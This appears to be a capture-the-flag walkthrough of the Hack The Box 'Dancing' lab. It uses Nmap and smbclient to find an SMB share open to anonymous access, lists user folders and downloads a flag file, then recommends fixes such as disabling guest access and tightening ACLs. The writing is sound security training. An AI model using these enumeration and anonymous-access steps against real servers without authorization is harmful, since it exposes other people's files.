# Hack The Box: Dancing

* **OS:** Windows
* **Difficulty:** Very Easy (Starting Point Tier 0)
* **Target Service:** SMB (Port 445)

## 1. Reconnaissance
Ran an Nmap scan to identify open ports on the target IP:
```bash
nmap -sV 10.129.249.139

Result: Port 445/tcp is open, running microsoft-ds (Server Message Block / SMB).

2. Enumeration
Listed available SMB shares using smbclient:

smbclient -L 10.129.249.139

Pressed Enter when prompted for a password to check for anonymous share access. Discovered an unauthenticated share named WorkShares.

3. Exploitation & Access
Connected directly to the WorkShares share without password authentication:

smbclient //<TARGET_IP>/WorkShares

4. Flag Retrieval
Navigated through user directories, downloaded flag.txt, and read its contents:

smb: \> ls
smb: \> cd James.P
smb: \> ls
smb: \> get flag.txt
smb: \> exit

cat flag.txt

5. Remediation
Disable guest/anonymous access to SMB shares across the network.
Enforce strict SMB share-level and NTFS permissions using access control lists (ACLs).
Audit existing shared folders to ensure sensitive data is not exposed publicly.
